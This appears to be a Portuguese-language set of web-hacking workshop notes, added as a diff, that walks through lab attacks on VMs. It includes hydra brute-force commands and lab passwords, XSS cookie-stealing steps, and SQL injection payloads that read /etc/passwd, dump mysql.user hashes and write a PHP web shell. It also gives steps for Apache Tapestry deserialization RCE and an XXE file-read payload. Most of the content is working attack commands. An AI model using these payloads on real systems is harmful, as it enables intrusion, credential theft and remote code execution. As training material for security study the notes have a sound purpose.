@@ -1,0 +1,248 @@
+[+] GoBuster (https://github.com/OJ/gobuster)
+	Very lightweight, fast directory and subdomain bruteforce tool
+	gobuster -u http://chat:3000 -w /opt/SecLists/Discovery/Web-Content/raft-small-
+	directories.txt -s 200,301,307 -t 20
+
+[+] Worlist para Web App
+	/opt/SecLists
+
+[+] A VM do Kali tem várias ferramentas e wordlists instaladas em:
+	/opt
+
+===========================	
+####
+## Kali VM
+####
+
+
+==[ Pentester Academy - Ataque de Brute Force
+
+	Basic Auth: https://pentesteracademylab.appspot.com/lab/webapp/basicauth
+	Digest: https://pentesteracademylab.appspot.com/lab/webapp/digest
+
+	1. Criando a wordlist para os dois challenges, ja que a senha segue o mesmo padrão:
+		crunch 5 5 asd > pacad_passwd.txt
+	2. Usando o hydra para hackear o Basic Auth:
+		hydra -l admin -P pacad_passwd.txt pentesteracademylab.appspot.com https-get /lab/webapp/digest/1
+	3. Usando o hydra para hackear o Digest:
+		hydra -l admin -P pacad_passwd.txt pentesteracademylab.appspot.com https-post /lab/webapp/basicauth
+	4. Sugestão: experimente fazer usando somente o Burp + a wordlist criada anteriormente.
+
+	
+===========================
+####
+## Atmail VM
+####
+
+==[ Painel de Webmail do Atmail:
+	
+	+ Webmail: http://atmail/index.php/mail/
+	Usuário: admin@h2hc.local - Senha: ILoveHacking
+	Usuário: atacante@h2hc.local - Senha: 123456
+	
+	+ Administration: http://atmail/index.php/admin/	
+	Usuário: admin - Senha: SenhaAdmin
+	
+
+==[ Brute Force
+
+----- BEGIN -------
+POST /index.php/mail/auth/processlogin HTTP/1.1
+Host: 192.168.234.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.234.128/index.php/mail/auth/processlogin
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 157
+Cookie: atmail6=kn6635ilgulh8n58i2014djs24
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+emailName=admin&emailDomain=h2hc.local&emailDomainDefault=&cssStyle=Original&email=admin%40h2hc.local&password=XXXXX&requestedServer=&MailType=IMAP&Language=
+----- END -------
+
+
+==[ XSS
+
+1. Identicando o XSS
+	- Executar xss-webmail-fuzzer.py
+
+2. Exercicios:
+	2.1. Criar uma popup com mensagem
+		- Executar atmail-poc_001.py
+	2.2. Criar uma popup exibindo o cookie de sessão
+		- Executar atmail-poc_002.py
+	2.3. XSS + Cookie Stealing
+		- Criar atmail-session.js para receber os cookies (Aponta para atmail-roubar-cookie.php)
+		- Criar atmail-roubar-cookie.php (Grava os cookies em atmail-cookies.txt)
+		- Executar atmail-poc_003.py (Gera o payload com atmail-session.js embutido)
+
+3. Payloads Adicionais:
+	3.1. Forçando a vítima baixar um executável:
+	<script>var link = document.createElement("a"); link.href = "http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe"; link.download = "";document.body.appendChild(link);link.click();</script>
+	
+	3.2. Redirecionando a vitima para outro site:
+	<script>window.location = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';</script>
+
+
+===========================
+####
+## Dell Scrutinizer VM
+####
+		
+==[ SQLi
+
+1. SQLi no parametro q (Precisa encodar como URL)
+	http://192.168.253.144/d4d/statusFilter.php?commonJson=protList&q=
+
+Payloads (Descrever cada um)
+	a'+or+1%3d1%23
+	a'+union+select+@@version,2%23
+	a'+union+select+user(),2%23
+	a'+union+select+database(),2%23
+	a'+union+select+concat(User,0x3a,Password),2+from+mysql.user%23
+	a'+union+all+select+load_file('/etc/passwd'),2%23
+	a'+union+all+select+'malvadao',2+into+outfile+'/home/plixer/scrutinizer/html/evil.php'%23
+	a'+union+all+select+'<pre><%3fphp+echo+shell_exec(\"\$_GET[cmd]\")%3b%3f></pre>',2+into+outfile+'/home/plixer/scrutinizer/html/exec.php'%23
+
+	
+Payload Completo
+
+----- BEGIN -------
+GET /d4d/statusFilter.php?commonJson=protList&q=a'+union+select+@@version,2%23 HTTP/1.1
+Host: 192.168.253.138
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,pt;q=0.8
+Cookie: cookiesenabled=1; userid=1; sessionid=KfVN2lNtuRNaQkbq
+Connection: close
+----- END -------
+
+
+===========================
+####
+## ChatSupportNode VM
+####
+
+1. Descobrindo diretorios da Aplicação Web
+/opt/gobuster/gobuster -u http://chat:3000 -w /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt -s 200,301,307 -t 20
+
+
+2. Brincando com WebSockets
+
+	// Criando uma conexão WebSocket
+	var meuWebSocket = new WebSocket('ws://html5rocks.websocket.org/echo', ['soap', 'xmpp']); 
+
+	// Registrando possiveis erros
+	meuWebSocket.onerror = function (error) {
+		console.log('Xi! Deu ruim ' + error);
+	};
+
+	// Recebendo as Respostas do Servidor
+	meuWebSocket.onmessage = function (e) {
+		console.log('Server: ' + e.data);
+	};
+
+	// Enviando outra mensagem para o servidor
+	meuWebSocket.send('WebHacking na H2HC');
+
+	// Fechando a conexão com o servidor
+	meuWebSocket.onclose = function() {
+		meuWebSocket.close();
+	};
+
+	
+===========================	
+####
+## Immunity VM
+####
+	
+==[ PayloadGenerator
+
+public static Runtime getRuntime
+
+
+==[ Tynamo
+Apache Tapestry Forms deserialization vulnerability
+
+Esta vulnerabilidade que iremos explorar não é publica, mas também não é realmente um 0day.
+Essa vuln impacta o Tapestry nas versões menores que 5.3.6
+A partir da versão 5.3.6 o t:formdata passou a usar validação com HMAC para prevenir esse tipo de exploit, mais informações estão disponíveis em: https://issues.apache.org/jira/browse/TAP5-2008)
+
+Iremos usar o Tynamo 5.3.2: http://www.tynamo.org/Quick+start/
+
+[*] Em um ataque onde não teríamos acesso aos arquivos fonte da aplicação:
+- Interceptar a conexão com o Burp
+- Em "List My Domains Objects" > "New My Domain Object" existe um XSS Refletido
+- Usar o Burp Decoder observando o Hex correspondente em cada tentatica de decode
+- Ao usar o decode de Base64 o dado aparecerá compactado em Bzip (Magic Number: 1F 8B)
+- Ao fazer o decode de Bzip você verá o dado serializado (Magic Number: AC ED)
+
+[*] Auditando a Aplicação:
+- Analisando o fluxo normal da aplicação percebemos que é chamado "/add.form" e então feito um redir para "/mydomainobject/new"
+- O redir acontece em "Add.java" invocando o evento "activate()" onde recebe uma classe.
+- Analisando o ""Call Hierarchy" (CTRL + ALT + H) vimos o uso de readObject.
+- Como já sabemos, para encontrar a vulnerabilidade de deserialização, voce precisa procurar pelos "deserialization methods"
+- No caso do Tynamo, voce deve procurar por "ois.readObject", você o encontrará na lib do "trapestry-core".
+- Nota importante: Quando você for fazer a busca no IntelliJ use a opção (CTRL + SHIFT + F) e tenha certeza de selecionar a opção "Scope" e então "Project and Libraries". Se você não selecionar isso corretamente sua busca ficará limitada e você não conseguirá encontrar as ocorrencias corretas.
+- Uma vez que você tenha achado o metodo "ois.readObject", você poderá selecionar e usar o "Call Hierarchy" (CTRL + ALT + H) para ver se você consegue encontrar a chamada correta e então definir um break point
+- A vulnerabilidade está no método "org.apache.tapestry5.corelib.components.Form.executeStoredActions", este metodo recebe o valor do parametro "t:formdata" da requisição POST e então chama o seguinte:
+	ois = clientDataEncoder.decodeClientData(clientEncodedActions);
+	
+- Se você observar o método "decodeClientData", que o IntelliJ irá fazer o download automaticamente com o Maven, você verá  seguinte:
+	BufferedInputStream buffered = new BufferedInputStream(new GZIPInputStream(new Base64InputStream(clientData)));
+	
+- Então agora já sabemos que o dado está sendo compactado com gzip e então encodado em base64. Isso é muito importante para criarmos nosso payload no formato correto para então submeter em "t:formdata" na aplicação.
+- Dessa forma, nosso payload precisa ser criado de forma a ser desserializado na aplicação- 
+- Na aplicação Tynamo, ao receber "t:dataform" é feito o seguinte:
+	String componentId = ois.readUTF();
+    ComponentAction action = (ComponentAction) ois.readObject();
+- Então em nosso PayloadGenerator, temos que modificar o seguinte:
+	FileOutputStream fout = new FileOutputStream("payload.ser");
+	ObjectOutputStream out = new ObjectOutputStream(fout);
+	out.writeUTF( "org.tynamo.components.Identifier"); #Encodando em UTF antes de escrever o arquivo
+	out.writeObject(handler);
+	out.close();
+	
+- A aplicação irá lançar uma excessão por causa do cast em ComponentAction, mas a essa altura já teremos no RCE.
+- Você também pode tentar fazer coisas diferentes, usando o ysoserial para submeter payloads para o Tynamo.
+- O script em Python exploit.py envia a requisição POST para a vitima, triggando assim a vulnerabilidade.
+- O payload precisa ser compactado com gzip e depois encodado em base64: 
+	cat payload.ser | gzip | base64
+
+- Você deve remover todos os espacos do payload usando um editor de texto.
+- Antes de submeter, usando o Burp, voce deve encodar no formado de URL.
+
+=[ Uma curiosidade:
+Em 2008 uma pessoa se mostrou preocupada com o t:formdata e um possível ataque de desserialização, mas o criador do Tapestry disse que o impacto na segurança se fosse possível, seriam mínimos.
+http://apache-tapestry-mailing-list-archives.1045711.n5.nabble.com/Security-of-t-formdata-td2420552.html
+
+
+==[ XXE Out of Band
+
+1. Acesse a aplicação em: http://localhost:8080/App1/
+
+2. Vá em Upload Articles e faça upload do XML abaix (Apenas o que está entre BEGIN e o END):
+
+----- BEGIN ------
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE Content [
+    <!ENTITY xxe SYSTEM 'file:///etc/passwd'>
+]>
+<Articles>
+    <Article>
+        <Title>Getting passwords</Title>
+        <Content>
+            /etc/passwd contents:
+            &xxe;
+        </Content>
+    </Article>
+</Articles>
+----- END ------
+
+3. Clique no menu Display Articles e voce verá o /etc/passwd sendo exibido
